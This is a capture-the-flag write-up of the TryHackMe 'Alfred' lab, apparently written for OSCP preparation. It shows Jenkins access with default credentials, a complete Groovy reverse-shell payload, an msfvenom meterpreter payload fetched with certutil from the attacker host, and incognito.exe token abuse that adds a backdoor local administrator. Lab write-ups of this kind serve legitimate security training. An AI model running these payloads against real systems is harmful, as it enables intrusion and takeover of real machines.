---
layout: post
title:  THM Alfred Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-19 08:00:00 +0300
image:  '/images/thm_alfred.png'
tags:   [Write-ups, THM, OSCP+, Easy, Windows, Jenkins, Default-Credentials, Groovy-Reverse-Shell, Incognito.exe, RDP, rdesktop]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [Accessing Jenkins with default credentials](#accessing-jenkins-with-default-credentials)
- [Foothold](#foothold)
  - [Groovy Reverse Shell on Jenkins to get access](#groovy-reverse-shell-on-jenkins-to-get-access)
  - [Upgrade Shell to Meterpreter and load PowerShell](#upgrade-shell-to-meterpreter-and-load-powershell)
- [Privilege Escalation](#privilege-escalation)
  - [SeImpersonatePrivilege and SeDebugPrivilege - Using Incognito.exe to add a new local Administrator user and access using RDP](#seimpersonateprivilege-and-sedebugprivilege---using-incognitoexe-to-add-a-new-local-administrator-user-and-access-using-rdp)

# Enumeration

### Nmap
```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.10.58.177

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p80,3389,8080 10.10.58.177
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 23:56 EST
Nmap scan report for 10.10.58.177
Host is up (0.051s latency).

PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2024-11-18T04:53:24
|_Not valid after:  2025-05-20T04:53:24
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2024-11-19T04:58:16+00:00
|_ssl-date: 2024-11-19T04:58:21+00:00; -8s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -8s, deviation: 0s, median: -8s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.98 seconds
```

Examining the results of our nmap scan, we can see that the ports 80 HTTP with Microsoft IIS, 3389 with RDP and 8080 with Jetty are open.

### Web Enumeration
We didnt find anything interesting when visiting port 80, just an email address.

But visiting port 8080 we found a Jenkins login portal:

```shell
http://10.10.58.177:8080/
```

### Accessing Jenkins with default credentials

We can try some default passwords to log in:

```shell
admin:password
admin:admin
root:password
root:root
jenkins:password
jenkins:jenkins
admin:jenkins
```

The combination admin:admin was successful and we got access into Jenkins.

# Foothold
### Groovy Reverse Shell on Jenkins to get access
Once we got access, we can try using a Groovy Reverse Shell to get shell access:

```shell
# Access Script Console
Go to -> Manage Jenkins -> Script Console

# We will get to that URL
http://10.10.58.177:8080/script
```

Then start a nc listener and enter a Groovy Reverse Shell there:

```shell
# Start nc listener
nc -lvnp 8443
```

```shell
String host="10.11.113.193";
int port=8443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

It worked! We got a response on our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.11.113.193] from (UNKNOWN) [10.10.58.177] 49219
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins>whoami
whoami
alfred\bruce
```

### Upgrade Shell to Meterpreter and load PowerShell
Trying to run PowerShell on the initial shell from Groovy reverse shell is a catastrophe.

Lets use meterpreter to get a stable PowerShell.

First create payload with msfvenom and move it:

```shell
# Create payload
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.113.193 LPORT=8080 -f exe -o met.exe

# Start python server on Kali
python3 -m http.server 80

# On target CLI, use certutil to move met.exe
cd C:\Users\bruce\Desktop
certutil.exe -urlcache -split -f http://10.11.113.193:80/met.exe
```

Start multi handler on Kali:

```shell
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.11.113.193
set LPORT 8080
run
```

Run met.exe on target CLI:

```shell
C:\Users\bruce\Desktop\met.exe
```

Load and get PowerShell on meterpreter:

```shell
load powershell
powershell_shell
```

Or use:

```shell
shell powershell
```


### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\bruce\Desktop\user.txt
```

# Privilege Escalation
### SeImpersonatePrivilege and SeDebugPrivilege - Using Incognito.exe to add a new local Administrator user and access using RDP
We can use whoami /priv to enumerate privileges:

```shell
whoami /priv

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

Examining the results we can see that two interesting privileges are enabled:

```shell
SeImpersonatePrivilege
SeDebugPrivilege
```

Doing some research, we found an exploit called Incognito. To use this exploit, the user needs to have both SeImpersonatePrivilege and SeDebugPrivilege enabled.

Lets do this without Metasploit:

```shell
# Get incognito.exe
git clone https://github.com/milkdevil/incognito2.git
cd incognito2

# Move incognito.exe to the target
certutil.exe -urlcache -split -f http://10.11.113.193:80/incognito.exe
```

Use incognito.exe to enumerate the tokens:

```shell
.\incognito.exe list_tokens -u
```

```shell
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Listing unique users found

Delegation Tokens Available
============================================
alfred\bruce 
IIS APPPOOL\DefaultAppPool 
NT AUTHORITY\IUSR 
NT AUTHORITY\LOCAL SERVICE 
NT AUTHORITY\NETWORK SERVICE 
NT AUTHORITY\SYSTEM 

Impersonation Tokens Available
============================================
NT AUTHORITY\ANONYMOUS LOGON 

Administrative Privileges Available
============================================
SeAssignPrimaryTokenPrivilege
SeCreateTokenPrivilege
SeTcbPrivilege
SeTakeOwnershipPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeRelabelPrivilege
SeLoadDriverPrivilege
```

Add a new user using incognito.exe:

```shell
.\incognito.exe add_user vorkharium password123
```

```shell
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Attempting to add user vorkharium to host 127.0.0.1
[+] Successfully added user
```

After that, use incognito.exe to add the new user to local administrators group:

```shell
.\incognito.exe add_localgroup_user Administrators vorkharium
```

```shell
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Attempting to add user vorkharium to local group Administrators on host 127.0.0.1
[+] Successfully added user to local group
```

Nice! We were able to successfully add a new user and make him a local administrator.

Now we can try to get access using the new user we created through RDP. I tried had some problems trying accessing with xfreerdp, but I was successful using rdesktop:

```shell
rdesktop 10.10.58.177 -u 'vorkharium' -p 'password123'
```

We can open the console and see if the new user is part of administrators:

```shell
net user vorkharium
```

Examining the output inside Local Group Memberships we can see that the new user is part of Administrators.

### Root Flag
Run cmd.exe as Administrator, now we can start our search for the root.txt flag using the following command:

```shell
dir \root.txt /s /p
```

Examining the results, we will see that the root.txt file is located at the following directory:

```shell
C:\Windows\System32\config
```

Lets get it:

```shell
type C:\Windows\System32\config\root.txt
```

